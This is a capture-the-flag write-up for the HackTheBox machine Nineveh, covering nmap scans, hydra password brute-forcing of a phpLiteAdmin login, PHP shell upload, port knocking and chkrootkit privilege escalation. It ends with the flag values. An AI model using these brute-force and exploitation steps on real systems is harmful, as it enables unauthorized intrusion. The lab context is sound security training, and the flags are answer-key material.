# Nineveh - 10.10.10.43 - HackTheBox

## Nmap Scan:

```java
# Nmap 7.80 scan initiated Tue Jun 30 13:42:46 2020 as: nmap -A -T4 -p80,443 -oN initial.nmap 10.10.10.43
Nmap scan report for 10.10.10.43
Host is up (0.20s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   190.59 ms 10.10.14.1
2   195.90 ms 10.10.10.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 30 13:43:22 2020 -- 1 IP address (1 host up) scanned in 36.85 seconds

```

# Initial Foothold

Starting off enumeration on port 80.

### Directory Bruteforce

PORT 80:

`/info.php` >> Content of this page has output of `phpinfo.php()`
`/department` >> Has a login page with an HTML comment in page source.

HTML comment: `@admin! MySQL is been installed.. please fix the login page! ~amrois`

`amrois` is a potential username.

PORT 443:

`/secure_notes` >> Just an image.
`/db` >> phpLiteAdmin v1.9


PUBLIC EXPLOIT on PHPLiteAdmin:

`PHPLiteAdmin 1.9.3 - Remote PHP Code Injection | exploits/php/webapps/24044.txt`

It requires authentication so I will use hydra for HTTP login bruteforce.

Hydra Command:

`hydra -l none -P rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64 -V`

Using user `none` doesn't help. We will target a generic username `admin`

Command:

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64`

Credentials:
`admin:password123`

Upload PHP Shell > Shell as www-data.

### Port Knocking

Analysing /etc/knockd.conf gives us sequence of ports to knock. Running strings on https://nineveh.htb/secure_notes/nineveh.png gives us SSH keys.

Port knock command:

`for x in 571 290 911; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.43; done`

SSH Port Opens

```
nmap -p22 10.10.10.43
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-30 14:50 IST
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up (0.49s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
```

Based on enumeration done on port 80, we can assume that `amrois` is a valid user.


# Privilege Escalation

Running LinEnum reveals that `/usr/sbin/report-reset.sh` is being run in a cronjob. It deletes `/report/*.txt` after every few seconds. Reviewing the report files tells that those are created by `chkrootkit`. There's a public exploit on it.

`Chkrootkit 0.49 - Local Privilege Escalation | exploits/linux/local/33899.txt`

Adding a bash reverse shell payload or simply copying /root/root.txt to /home/amrois/root.txt will work in `/tmp/update`

## Flags

user.txt: `82a864f9eec2a76c166ec7b1078ca6c8`
root.txt: `8a2b4956612b485720694fb45849ec3a`
